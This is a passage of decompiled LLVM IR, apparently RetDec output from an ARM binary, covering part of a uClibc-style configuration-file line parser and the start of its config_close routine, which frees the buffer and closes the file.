  %v3_1405c = inttoptr i32 %v2_14054 to i8*
  %v4_1405c = call i32 @__GI_memset(i8* %v3_1405c, i32 0, i32 %v5_14054)
  store i32 %v4_1405c, i32* %r0.global-to-local, align 4
  %v0_14060 = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_14280

dec_label_pc_14068:                               ; preds = %dec_label_pc_14030
  %v2_14068 = inttoptr i32 %v1_14050 to i32*
  %v3_14068 = load i32, i32* %v2_14068, align 4
  store i32 %v3_14068, i32* @r4, align 4
  %v1_1406c = load i32, i32* @r6, align 4
  %v2_1406c = add i32 %v1_1406c, %v3_14068
  %v3_1406c = inttoptr i32 %v2_1406c to i8*
  store i32 %v2_1406c, i32* %r0.global-to-local, align 4
  %v3_14070 = call i32 @strlen(i8* %v3_1406c)
  %v0_14078 = load i32, i32* @r6, align 4
  %v2_14078 = add i32 %v0_14078, %v3_14070
  store i32 %v2_14078, i32* @r6, align 4
  %v0_1407c = load i32, i32* @r4, align 4
  store i32 %v0_1407c, i32* @r0, align 4
  %v2_14080 = call i32 @__GI_strchr(i32 %v0_1407c, i32 10)
  store i32 %v2_14080, i32* %r0.global-to-local, align 4
  %v2_14084 = icmp eq i32 %v2_14080, 0
  store i1 %v2_14084, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_14084, label %dec_label_pc_140b0, label %dec_label_pc_1408c

dec_label_pc_1408c:                               ; preds = %dec_label_pc_14068
  %v1_1408c = inttoptr i32 %v2_14080 to i8*
  %v2_1408c = load i8, i8* %v1_1408c, align 1
  %v3_1408c = zext i8 %v2_1408c to i32
  %v1_14090 = add nuw nsw i32 %v3_1408c, 255
  %v1_14094 = urem i32 %v1_14090, 256
  store i32 %v1_14094, i32* %r3.global-to-local, align 4
  %v7_14098 = icmp eq i32 %v1_14094, 92
  store i1 %v7_14098, i1* %cpsr_z.global-to-local, align 1
  %v1_1409c = trunc i32 %v1_14090 to i8
  store i8 %v1_1409c, i8* %v1_1408c, align 1
  %v0_140a0 = load i32, i32* @r6, align 4
  %v1_140a0 = add i32 %v0_140a0, -1
  store i32 %v1_140a0, i32* @r6, align 4
  %v0_140a4 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_140a4, label %dec_label_pc_140a8, label %dec_label_pc_14134

dec_label_pc_140a8:                               ; preds = %dec_label_pc_1408c
  %v1_140a8 = add i32 %v0_140a0, -2
  store i32 %v1_140a8, i32* @r6, align 4
  br label %dec_label_pc_14030

dec_label_pc_140b0:                               ; preds = %dec_label_pc_14068
  %v0_140b0 = load i32, i32* @r5, align 4
  %v1_140b0 = add i32 %v0_140b0, 20
  %v2_140b0 = inttoptr i32 %v1_140b0 to i32*
  %v3_140b0 = load i32, i32* %v2_140b0, align 4
  store i32 %v3_140b0, i32* %r3.global-to-local, align 4
  %v2_140b4 = icmp eq i32 %v3_140b0, 0
  store i1 %v2_140b4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_140b4, label %dec_label_pc_140ec, label %dec_label_pc_140bc

dec_label_pc_140bc:                               ; preds = %dec_label_pc_140b0
  %v1_140bc = add i32 %v0_140b0, 16
  %v2_140bc = inttoptr i32 %v1_140bc to i32*
  %v3_140bc = load i32, i32* %v2_140bc, align 4
  store i32 %v3_140bc, i32* %r3.global-to-local, align 4
  %v1_140c0 = add i32 %v0_140b0, 8
  %v2_140c0 = inttoptr i32 %v1_140c0 to i32*
  %v3_140c0 = load i32, i32* %v2_140c0, align 4
  %v1_140c4 = add i32 %v3_140bc, 4096
  store i32 %v1_140c4, i32* %r3.global-to-local, align 4
  %v2_140c8 = add i32 %v3_140c0, %v1_140c4
  store i32 %v1_140c4, i32* %v2_140bc, align 4
  %v0_140d0 = load i32, i32* @r5, align 4
  %v1_140d0 = add i32 %v0_140d0, 4
  %v2_140d0 = inttoptr i32 %v1_140d0 to i32*
  %v3_140d0 = load i32, i32* %v2_140d0, align 4
  store i32 %v3_140d0, i32* %r0.global-to-local, align 4
  %v4_140d4 = inttoptr i32 %v3_140d0 to i32*
  %v5_140d4 = call i32 @realloc(i32* %v4_140d4, i32 %v2_140c8, i32 %v2_14040, i32 %v1_140c4)
  store i32 %v5_140d4, i32* %r0.global-to-local, align 4
  %v0_140d8 = load i32, i32* @r5, align 4
  %v1_140d8 = add i32 %v0_140d8, 8
  %v2_140d8 = inttoptr i32 %v1_140d8 to i32*
  %v3_140d8 = load i32, i32* %v2_140d8, align 4
  %v2_140dc = add i32 %v3_140d8, %v5_140d4
  store i32 %v2_140dc, i32* %r3.global-to-local, align 4
  %v2_140e0 = add i32 %v0_140d8, 12
  %v3_140e0 = inttoptr i32 %v2_140e0 to i32*
  store i32 %v2_140dc, i32* %v3_140e0, align 4
  %v1_140e4 = load i32, i32* @r5, align 4
  %v2_140e4 = add i32 %v1_140e4, 4
  %v3_140e4 = inttoptr i32 %v2_140e4 to i32*
  store i32 %v5_140d4, i32* %v3_140e4, align 4
  %v0_14038.pre.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_14030

dec_label_pc_140ec:                               ; preds = %dec_label_pc_140b0, %.dec_label_pc_140ec_crit_edge
  %v0_140ec = phi i32 [ %v0_140ec.pre, %.dec_label_pc_140ec_crit_edge ], [ %v0_140b0, %dec_label_pc_140b0 ]
  %v1_140ec = inttoptr i32 %v0_140ec to i32*
  %v2_140ec = load i32, i32* %v1_140ec, align 4
  store i32 %v2_140ec, i32* @r1, align 4
  %v1_140f0 = add i32 %v2_140ec, 52
  %v2_140f0 = inttoptr i32 %v1_140f0 to i32*
  %v3_140f0 = load i32, i32* %v2_140f0, align 4
  store i32 %v3_140f0, i32* %r3.global-to-local, align 4
  %v2_140f4 = icmp eq i32 %v3_140f0, 0
  store i1 %v2_140f4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_140f4, label %dec_label_pc_14120, label %dec_label_pc_140fc

dec_label_pc_140fc:                               ; preds = %dec_label_pc_140ec
  %v1_140fc = add i32 %v2_140ec, 16
  %v2_140fc = inttoptr i32 %v1_140fc to i32*
  %v3_140fc = load i32, i32* %v2_140fc, align 4
  store i32 %v3_140fc, i32* %r2.global-to-local, align 4
  %v1_14100 = add i32 %v2_140ec, 24
  %v2_14100 = inttoptr i32 %v1_14100 to i32*
  %v3_14100 = load i32, i32* %v2_14100, align 4
  store i32 %v3_14100, i32* %r3.global-to-local, align 4
  %v3_14104 = icmp ult i32 %v3_140fc, %v3_14100
  %v9_14104 = icmp eq i32 %v3_140fc, %v3_14100
  store i1 %v9_14104, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_14104, label %dec_label_pc_14128thread-pre-split, label %dec_label_pc_14114

dec_label_pc_14114:                               ; preds = %dec_label_pc_140fc
  store i32 %v2_140ec, i32* %r0.global-to-local, align 4
  %v1_14118 = inttoptr i32 %v2_140ec to i16*
  %v2_14118 = call i32 @getc_unlocked(i16* %v1_14118)
  store i32 %v2_14118, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_14128

dec_label_pc_14120:                               ; preds = %dec_label_pc_140ec
  store i32 %v2_140ec, i32* %r0.global-to-local, align 4
  %v1_14124 = call i32 @__GI_fgetc(i32 %v2_140ec)
  store i32 %v1_14124, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_14128

dec_label_pc_14128thread-pre-split:               ; preds = %dec_label_pc_140fc
  %v2_14108 = inttoptr i32 %v3_140fc to i8*
  %v3_14108 = load i8, i8* %v2_14108, align 1
  %v4_14108 = zext i8 %v3_14108 to i32
  store i32 %v4_14108, i32* %r0.global-to-local, align 4
  %v6_14108 = add i32 %v3_140fc, 1
  store i32 %v6_14108, i32* %r2.global-to-local, align 4
  store i32 %v6_14108, i32* %v2_140fc, align 4
  %v0_14128.pr = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_14128

dec_label_pc_14128:                               ; preds = %dec_label_pc_14128thread-pre-split, %dec_label_pc_14114, %dec_label_pc_14120
  %v1_1412c = phi i32 [ %v0_14128.pr, %dec_label_pc_14128thread-pre-split ], [ %v2_14118, %dec_label_pc_14114 ], [ %v1_14124, %dec_label_pc_14120 ]
  %v7_14128 = icmp eq i32 %v1_1412c, 10
  store i1 %v7_14128, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_14128, label %dec_label_pc_14134.loopexit, label %bb66

bb66:                                             ; preds = %dec_label_pc_14128
  %v8_1412c = icmp eq i32 %v1_1412c, -1
  store i1 %v8_1412c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_1412c, label %dec_label_pc_14134.loopexit, label %.dec_label_pc_140ec_crit_edge

.dec_label_pc_140ec_crit_edge:                    ; preds = %bb66
  %v0_140ec.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_140ec

dec_label_pc_14134.loopexit:                      ; preds = %bb66, %dec_label_pc_14128
  %v0_14134.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_14134

dec_label_pc_14134:                               ; preds = %dec_label_pc_1408c, %dec_label_pc_14134.loopexit
  %v0_14134 = phi i32 [ %v0_14134.pre, %dec_label_pc_14134.loopexit ], [ %v1_140a0, %dec_label_pc_1408c ]
  %v7_14134 = icmp eq i32 %v0_14134, -1
  store i1 %v7_14134, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_14134, label %dec_label_pc_1427c, label %dec_label_pc_1413c

dec_label_pc_1413c:                               ; preds = %dec_label_pc_14134
  store i32 %v1_13fa4, i32* %r3.global-to-local, align 4
  store i1 %v2_14140, i1* %cpsr_z.global-to-local, align 1
  %v0_14144 = load i32, i32* @r5, align 4
  %v1_14144 = add i32 %v0_14144, 12
  %v2_14144 = inttoptr i32 %v1_14144 to i32*
  %v3_14144 = load i32, i32* %v2_14144, align 4
  store i32 %v3_14144, i32* @r4, align 4
  br i1 %v2_14140, label %dec_label_pc_1415c, label %dec_label_pc_1414c

dec_label_pc_1414c:                               ; preds = %dec_label_pc_1413c
  store i32 %v3_14144, i32* @r0, align 4
  %v0_14150 = load i32, i32* @sl, align 4
  %v2_14154 = inttoptr i32 %v3_14144 to i8*
  %v3_14154 = call i32 @__GI_strspn(i8* %v2_14154, i32 %v0_14150)
  store i32 %v3_14154, i32* %r0.global-to-local, align 4
  %v0_14158 = load i32, i32* @r4, align 4
  %v2_14158 = add i32 %v0_14158, %v3_14154
  store i32 %v2_14158, i32* @r4, align 4
  br label %dec_label_pc_1415c

dec_label_pc_1415c:                               ; preds = %dec_label_pc_1413c, %dec_label_pc_1414c
  %v0_1415c = phi i32 [ %v3_14144, %dec_label_pc_1413c ], [ %v2_14158, %dec_label_pc_1414c ]
  %v1_1415c = inttoptr i32 %v0_1415c to i8*
  %v2_1415c = load i8, i8* %v1_1415c, align 1
  %v3_1415c = zext i8 %v2_1415c to i32
  store i32 %v3_1415c, i32* %r2.global-to-local, align 4
  %v2_14160 = icmp eq i8 %v2_1415c, 0
  store i1 %v2_14160, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_14160, label %dec_label_pc_13fcc.backedge, label %dec_label_pc_14168

dec_label_pc_13fcc.backedge:                      ; preds = %dec_label_pc_1415c, %dec_label_pc_14168, %dec_label_pc_14274
  %v0_13fcc.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_13fcc

dec_label_pc_14168:                               ; preds = %dec_label_pc_1415c
  %v0_14168 = load i32, i32* @r7, align 4
  %v1_14168 = inttoptr i32 %v0_14168 to i8*
  %v2_14168 = load i8, i8* %v1_14168, align 1
  %v3_14168 = zext i8 %v2_14168 to i32
  store i32 %v3_14168, i32* %r3.global-to-local, align 4
  %v9_1416c = icmp eq i8 %v2_14168, %v2_1415c
  store i1 %v9_1416c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_1416c, label %dec_label_pc_13fcc.backedge, label %dec_label_pc_14174

dec_label_pc_14174:                               ; preds = %dec_label_pc_14168
  store i32 %arg2, i32* %r2.global-to-local, align 4
  %v0_14178 = load i32, i32* @r5, align 4
  %v1_14178 = add i32 %v0_14178, 4
  %v2_14178 = inttoptr i32 %v1_14178 to i32*
  %v3_14178 = load i32, i32* %v2_14178, align 4
  store i32 %v3_14178, i32* %r0.global-to-local, align 4
  %v0_1417c = load i32, i32* @fp, align 4
  store i32 %v3_14178, i32* %v1_14198, align 4
  store i32 %v3_13f90, i32* %r2.global-to-local, align 4
  %v3_14188 = inttoptr i32 %v3_14178 to i8*
  %v4_14188 = call i32 @__GI_memset(i8* %v3_14188, i32 %v0_1417c, i32 %v3_13f90)
  store i32 %v4_14188, i32* %r0.global-to-local, align 4
  %v0_1418c = load i32, i32* @fp, align 4
  store i32 %v0_1418c, i32* @r6, align 4
  %v0_1424c12 = load i32, i32* @r4, align 4
  %v1_1424c13 = inttoptr i32 %v0_1424c12 to i8*
  %v2_1424c14 = load i8, i8* %v1_1424c13, align 1
  %v3_1424c15 = zext i8 %v2_1424c14 to i32
  store i32 %v3_1424c15, i32* %r2.global-to-local, align 4
  %v2_1425016 = icmp eq i8 %v2_1424c14, 0
  store i1 %v2_1425016, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1425016, label %dec_label_pc_14268, label %dec_label_pc_14258

dec_label_pc_14194:                               ; preds = %bb72
  store i32 %arg2, i32* %r2.global-to-local, align 4
  %v2_14198 = load i32, i32* %v1_14198, align 4
  store i32 %v2_14198, i32* %r3.global-to-local, align 4
  store i32 %v1_13fa8, i32* %r2.global-to-local, align 4
  %v9_141a0 = icmp eq i32 %v2_141a4, %v1_13fa8
  store i1 %v9_141a0, i1* %cpsr_z.global-to-local, align 1
  %v5_141a4 = mul i32 %v2_141a4, 4
  %v6_141a4 = add i32 %v2_14198, %v5_141a4
  %v7_141a4 = inttoptr i32 %v6_141a4 to i32*
  store i32 %v0_141a4, i32* %v7_141a4, align 4
  br i1 %v9_141a0, label %dec_label_pc_141ac, label %dec_label_pc_141b8

dec_label_pc_141ac:                               ; preds = %dec_label_pc_14194
  store i32 %v1_13fb4, i32* %r3.global-to-local, align 4
  store i1 %v2_141b0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_141b0, label %dec_label_pc_141b8, label %dec_label_pc_141d8

dec_label_pc_141b8:                               ; preds = %dec_label_pc_141ac, %dec_label_pc_14194
  %v0_141b8 = load i32, i32* @r7, align 4
  %v1_141b8 = inttoptr i32 %v0_141b8 to i8*
  %v2_141b8 = load i8, i8* %v1_141b8, align 1
  %v3_141b8 = zext i8 %v2_141b8 to i32
  store i32 %v3_141b8, i32* %r3.global-to-local, align 4
  %v2_141bc = icmp eq i8 %v2_141b8, 0
  store i1 %v2_141bc, i1* %cpsr_z.global-to-local, align 1
  %v0_141c0 = load i32, i32* @r4, align 4
  store i32 %v0_141c0, i32* @r0, align 4
  %v1_141c4 = load i32, i32* @sl, align 4
  %storemerge = select i1 %v2_141bc, i32 %v1_141c4, i32 %v0_141b8
  store i32 %storemerge, i32* @r1, align 4
  %v0_141cc = call i32 @strcspn()
  store i32 %v0_141cc, i32* %r0.global-to-local, align 4
  %v0_141d0 = load i32, i32* @r4, align 4
  %v2_141d0 = add i32 %v0_141d0, %v0_141cc
  store i32 %v2_141d0, i32* @r4, align 4
  br label %dec_label_pc_14210

dec_label_pc_141d8:                               ; preds = %dec_label_pc_141ac
  %v0_141d8 = load i32, i32* @r4, align 4
  store i32 %v0_141d8, i32* @r0, align 4
  %v0_141dc = load i32, i32* @r7, align 4
  %v1_141dc = inttoptr i32 %v0_141dc to i8*
  %v2_141dc = load i8, i8* %v1_141dc, align 1
  %v3_141dc = zext i8 %v2_141dc to i32
  %v5_141e0 = call i32 @__GI_strchrnul(i32 %v0_141d8, i32 %v3_141dc, i32 %v1_13fa8, i32 %v1_13fb4)
  store i32 %v5_141e0, i32* %r0.global-to-local, align 4
  store i32 %v1_13fa4, i32* %r2.global-to-local, align 4
  store i1 %v2_14140, i1* %cpsr_z.global-to-local, align 1
  store i32 %v5_141e0, i32* @r4, align 4
  br i1 %v2_14140, label %dec_label_pc_14210, label %dec_label_pc_141fc

dec_label_pc_141f8:                               ; preds = %dec_label_pc_141fc
  %v1_141f8 = add i32 %v0_14210.pre, -1
  store i32 %v1_141f8, i32* @r4, align 4
  br label %dec_label_pc_141fc

dec_label_pc_141fc:                               ; preds = %dec_label_pc_141d8, %dec_label_pc_141f8
  %v0_141fc = phi i32 [ %v1_141f8, %dec_label_pc_141f8 ], [ %v5_141e0, %dec_label_pc_141d8 ]
  %v1_141fc = add i32 %v0_141fc, -1
  %v2_141fc = inttoptr i32 %v1_141fc to i8*
  %v3_141fc = load i8, i8* %v2_141fc, align 1
  %v4_141fc = zext i8 %v3_141fc to i32
  %v0_14200 = load i32, i32* @sl, align 4
  store i32 %v0_14200, i32* @r0, align 4
  %v2_14204 = call i32 @__GI_strchr(i32 %v0_14200, i32 %v4_141fc)
  store i32 %v2_14204, i32* %r0.global-to-local, align 4
  %v2_14208 = icmp eq i32 %v2_14204, 0
  store i1 %v2_14208, i1* %cpsr_z.global-to-local, align 1
  %v0_14210.pre = load i32, i32* @r4, align 4
  br i1 %v2_14208, label %dec_label_pc_14210, label %dec_label_pc_141f8

dec_label_pc_14210:                               ; preds = %dec_label_pc_141fc, %dec_label_pc_141d8, %dec_label_pc_141b8
  %v3_1421c = phi i32 [ %v5_141e0, %dec_label_pc_141d8 ], [ %v2_141d0, %dec_label_pc_141b8 ], [ %v0_14210.pre, %dec_label_pc_141fc ]
  %v1_14210 = inttoptr i32 %v3_1421c to i8*
  %v2_14210 = load i8, i8* %v1_14210, align 1
  %v3_14210 = zext i8 %v2_14210 to i32
  store i32 %v3_14210, i32* %r2.global-to-local, align 4
  %v0_14214 = load i32, i32* @r7, align 4
  %v1_14214 = inttoptr i32 %v0_14214 to i8*
  %v2_14214 = load i8, i8* %v1_14214, align 1
  %v3_14214 = zext i8 %v2_14214 to i32
  store i32 %v3_14214, i32* %r3.global-to-local, align 4
  %v9_14218 = icmp eq i8 %v2_14214, %v2_14210
  store i1 %v9_14218, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_14218, label %bb69, label %dec_label_pc_14224

bb69:                                             ; preds = %dec_label_pc_14210
  %v1_1421c = load i32, i32* @fp, align 4
  %v2_1421c = trunc i32 %v1_1421c to i8
  store i8 %v2_1421c, i8* %v1_14210, align 1
  %v0_14220.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_14220.pr, label %bb71, label %.dec_label_pc_14224_crit_edge

.dec_label_pc_14224_crit_edge:                    ; preds = %bb69
  %v0_14224.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_14224

dec_label_pc_14224:                               ; preds = %.dec_label_pc_14224_crit_edge, %dec_label_pc_14210
  %v0_14224 = phi i32 [ %v0_14224.pre, %.dec_label_pc_14224_crit_edge ], [ %v3_14210, %dec_label_pc_14210 ]
  %v2_14224 = icmp eq i32 %v0_14224, 0
  store i1 %v2_14224, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_14224, label %bb71, label %bb70

bb70:                                             ; preds = %dec_label_pc_14224
  %v1_14228 = load i32, i32* @fp, align 4
  %v2_14228 = trunc i32 %v1_14228 to i8
  %v3_14228 = load i32, i32* @r4, align 4
  %v4_14228 = inttoptr i32 %v3_14228 to i8*
  store i8 %v2_14228, i8* %v4_14228, align 1
  %v5_14228 = load i32, i32* @r4, align 4
  %v6_14228 = add i32 %v5_14228, 1
  store i32 %v6_14228, i32* @r4, align 4
  br label %bb71

bb71:                                             ; preds = %bb69, %dec_label_pc_14224, %bb70
  %v2_1422c = load i32, i32* %stack_var_-72, align 4
  store i32 %v2_1422c, i32* %r3.global-to-local, align 4
  %v2_14230 = icmp eq i32 %v2_1422c, 0
  store i1 %v2_14230, i1* %cpsr_z.global-to-local, align 1
  %v0_1424c.pre = load i32, i32* @r4, align 4
  br i1 %v2_14230, label %dec_label_pc_14248, label %dec_label_pc_14238

dec_label_pc_14238:                               ; preds = %bb71
  store i32 %v0_1424c.pre, i32* @r0, align 4
  %v0_1423c = load i32, i32* @sl, align 4
  %v2_14240 = inttoptr i32 %v0_1424c.pre to i8*
  %v3_14240 = call i32 @__GI_strspn(i8* %v2_14240, i32 %v0_1423c)
  store i32 %v3_14240, i32* %r0.global-to-local, align 4
  %v0_14244 = load i32, i32* @r4, align 4
  %v2_14244 = add i32 %v0_14244, %v3_14240
  store i32 %v2_14244, i32* @r4, align 4
  br label %dec_label_pc_14248

dec_label_pc_14248:                               ; preds = %bb71, %dec_label_pc_14238
  %v0_1424c = phi i32 [ %v2_14244, %dec_label_pc_14238 ], [ %v0_1424c.pre, %bb71 ]
  %v0_14248 = load i32, i32* @r6, align 4
  %v1_14248 = add i32 %v0_14248, 1
  store i32 %v1_14248, i32* @r6, align 4
  %v1_1424c = inttoptr i32 %v0_1424c to i8*
  %v2_1424c = load i8, i8* %v1_1424c, align 1
  %v3_1424c = zext i8 %v2_1424c to i32
  store i32 %v3_1424c, i32* %r2.global-to-local, align 4
  %v2_14250 = icmp eq i8 %v2_1424c, 0
  store i1 %v2_14250, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_14250, label %dec_label_pc_14268, label %dec_label_pc_14258

dec_label_pc_14258:                               ; preds = %dec_label_pc_14174, %dec_label_pc_14248
  %v0_141a4 = phi i32 [ %v0_1424c, %dec_label_pc_14248 ], [ %v0_1424c12, %dec_label_pc_14174 ]
  %v2_141a4 = phi i32 [ %v1_14248, %dec_label_pc_14248 ], [ %v0_1418c, %dec_label_pc_14174 ]
  %v1_1425c = phi i32 [ %v3_1424c, %dec_label_pc_14248 ], [ %v3_1424c15, %dec_label_pc_14174 ]
  %v0_14258 = load i32, i32* @r7, align 4
  %v1_14258 = inttoptr i32 %v0_14258 to i8*
  %v2_14258 = load i8, i8* %v1_14258, align 1
  %v3_14258 = zext i8 %v2_14258 to i32
  store i32 %v3_14258, i32* %r3.global-to-local, align 4
  %v9_1425c = icmp eq i32 %v3_14258, %v1_1425c
  store i1 %v9_1425c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_1425c, label %dec_label_pc_14268, label %bb72

bb72:                                             ; preds = %dec_label_pc_14258
  %v2_14260 = load i32, i32* @sb, align 4
  %v3_14260 = sub i32 %v2_141a4, %v2_14260
  %v5_14260 = xor i32 %v2_14260, %v2_141a4
  %v6_14260 = xor i32 %v3_14260, %v2_141a4
  %v7_14260 = and i32 %v6_14260, %v5_14260
  %v8_14260 = icmp slt i32 %v7_14260, 0
  %v9_14260 = icmp slt i32 %v3_14260, 0
  %v10_14260 = icmp eq i32 %v2_141a4, %v2_14260
  store i1 %v10_14260, i1* %cpsr_z.global-to-local, align 1
  %v2_14264 = xor i1 %v9_14260, %v8_14260
  br i1 %v2_14264, label %dec_label_pc_14194, label %dec_label_pc_14268

dec_label_pc_14268:                               ; preds = %dec_label_pc_14258, %dec_label_pc_14248, %bb72, %dec_label_pc_14174
  %v0_1426c = phi i32 [ %v0_1418c, %dec_label_pc_14174 ], [ %v2_141a4, %dec_label_pc_14258 ], [ %v1_14248, %dec_label_pc_14248 ], [ %v2_141a4, %bb72 ]
  store i32 %v3_13f8c, i32* %r2.global-to-local, align 4
  %v9_1426c = icmp eq i32 %v0_1426c, %v3_13f8c
  store i1 %v9_1426c, i1* %cpsr_z.global-to-local, align 1
  %v6_14270 = icmp slt i32 %v0_1426c, %v3_13f8c
  br i1 %v6_14270, label %dec_label_pc_14274, label %dec_label_pc_14280

dec_label_pc_14274:                               ; preds = %dec_label_pc_14268
  %v0_14274 = load i32, i32* @r8, align 4
  %v1_14274 = and i32 %v0_14274, 1048576
  %v2_14274 = icmp eq i32 %v1_14274, 0
  store i1 %v2_14274, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_14274, label %dec_label_pc_13fcc.backedge, label %dec_label_pc_1427c

dec_label_pc_1427c:                               ; preds = %dec_label_pc_14274, %dec_label_pc_14134, %.thread, %entry
  br label %dec_label_pc_14280

dec_label_pc_14280:                               ; preds = %dec_label_pc_14268, %dec_label_pc_14050, %dec_label_pc_1427c
  %v0_14280 = phi i32 [ %v0_14060, %dec_label_pc_14050 ], [ 0, %dec_label_pc_1427c ], [ %v0_1426c, %dec_label_pc_14268 ]
  store i32 %v0_14280, i32* %r0.global-to-local, align 4
  store i32 %v3_13f68, i32* @r4, align 4
  store i32 %v6_13f68, i32* @r5, align 4
  store i32 %v9_13f68, i32* @r6, align 4
  store i32 %v12_13f68, i32* @r7, align 4
  store i32 %v15_13f68, i32* @r8, align 4
  store i32 %v18_13f68, i32* @sb, align 4
  store i32 %v21_13f68, i32* @sl, align 4
  store i32 %v24_13f68, i32* @fp, align 4
  ret i32 %v0_14280

; uselistorder directives
  uselistorder i32 %v0_14280, { 1, 0 }
  uselistorder i32 %v0_1426c, { 0, 2, 1 }
  uselistorder i32 %v3_14260, { 1, 0 }
  uselistorder i32 %v2_14260, { 1, 0, 2 }
  uselistorder i32 %v2_141a4, { 0, 1, 7, 2, 3, 6, 5, 4 }
  uselistorder i32 %v0_1424c.pre, { 0, 2, 1 }
  uselistorder i32 %v5_141e0, { 1, 0, 2, 3 }
  uselistorder i32 %v0_1418c, { 1, 0, 2 }
  uselistorder i1 %v9_1416c, { 1, 0 }
  uselistorder i32 %v3_14144, { 0, 2, 1, 3 }
  uselistorder i1 %v7_14134, { 1, 0 }
  uselistorder i1 %v8_1412c, { 1, 0 }
  uselistorder i32 %v3_140fc, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v2_140ec, { 3, 2, 0, 1, 4, 5, 6, 7 }
  uselistorder i32 %v5_140d4, { 1, 0, 2 }
  uselistorder i32 %v1_140c4, { 1, 2, 0, 3 }
  uselistorder i32 %v0_140b0, { 0, 2, 1, 3 }
  uselistorder i32 %v1_140a8, { 1, 0 }
  uselistorder i32 %v1_14094, { 1, 0 }
  uselistorder i32 %v1_14090, { 1, 0 }
  uselistorder i32 %v2_1406c, { 1, 0 }
  uselistorder i32 %v1_14050, { 2, 0, 1 }
  uselistorder i32 %v0_14038, { 1, 0 }
  uselistorder i32 %v1_14028, { 0, 2, 1 }
  uselistorder i32* %v1_14198, { 1, 0 }
  uselistorder i1 %v2_14140, { 1, 0, 2, 3 }
  uselistorder i32 %v1_13fb4, { 2, 0, 1, 3 }
  uselistorder i32 %v1_13fa8, { 2, 1, 0 }
  uselistorder i32 %v3_13f90, { 1, 2, 0 }
  uselistorder i32 %v3_13f8c, { 2, 1, 0 }
  uselistorder i32 %v1_13f84, { 2, 0, 1 }
  uselistorder i32* %r3.global-to-local, { 6, 1, 2, 3, 4, 5, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 8, 3, 4, 5, 6, 7, 2, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 4, 5, 7, 6, 8, 11, 12, 10, 9, 14, 13, 16, 15, 17, 18, 21, 19, 20, 25, 22, 23, 24, 27, 26, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 0, 1, 12, 13, 14, 2, 3, 4, 5, 7, 8, 9, 10, 11, 6, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32 }
  uselistorder i32 1048576, { 4, 3, 5, 0, 1, 2 }
  uselistorder i32 (i32*, i32, i32, i32)* @realloc, { 1, 0, 2, 3, 4, 5, 6, 7, 8, 9, 10 }
  uselistorder i32 %arg3, { 3, 4, 2, 0, 1, 5, 6 }
  uselistorder i32 %arg2, { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_14280, { 2, 0, 1 }
  uselistorder label %dec_label_pc_14268, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_14258, { 1, 0 }
  uselistorder label %dec_label_pc_14248, { 1, 0 }
  uselistorder label %bb71, { 2, 1, 0 }
  uselistorder label %dec_label_pc_141fc, { 1, 0 }
  uselistorder label %dec_label_pc_13fcc.backedge, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1415c, { 1, 0 }
  uselistorder label %dec_label_pc_14134, { 1, 0 }
  uselistorder label %dec_label_pc_14128, { 0, 2, 1 }
  uselistorder label %dec_label_pc_140ec, { 1, 0 }
  uselistorder label %dec_label_pc_14020, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
  uselistorder label %bb64, { 1, 0 }
}

define i32 @__GI_config_close(i32* %arg1) local_unnamed_addr {
entry:
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* @r4, align 4
  %v2_14294 = icmp eq i32* %arg1, null
  br i1 %v2_14294, label %dec_label_pc_142bc, label %dec_label_pc_1429c

dec_label_pc_1429c:                               ; preds = %entry
  %v2_1429c = load i32, i32* %arg1, align 4
  %v1_142a0 = inttoptr i32 %v2_1429c to i16*
  %v2_142a0 = call i32 @__GI_fclose(i16* %v1_142a0)
  %v0_142a4 = load i32, i32* @r4, align 4
  %v1_142a4 = add i32 %v0_142a4, 20
  %v2_142a4 = inttoptr i32 %v1_142a4 to i32*
  %v3_142a4 = load i32, i32* %v2_142a4, align 4
  %v2_142a8 = icmp eq i32 %v3_142a4, 0
  br i1 %v2_142a8, label %bb6, label %bb

bb:                                               ; preds = %dec_label_pc_1429c
  br label %bb6

bb6:                                              ; preds = %dec_label_pc_1429c, %bb
  store i32 82612, i32* @lr, align 4
  %v1_142b0 = xor i1 %v2_142a8, true
  call void @__pseudo_cond_branch(i1 %v1_142b0, i32 ptrtoint (i32* @global_var_11abc.29 to i32))
  %v0_142b4 = load i32, i32* @r4, align 4
  store i32 %v0_142b4, i32* @r0, align 4
  %v0_142b8 = call i32 @free()
  br label %dec_label_pc_142bc

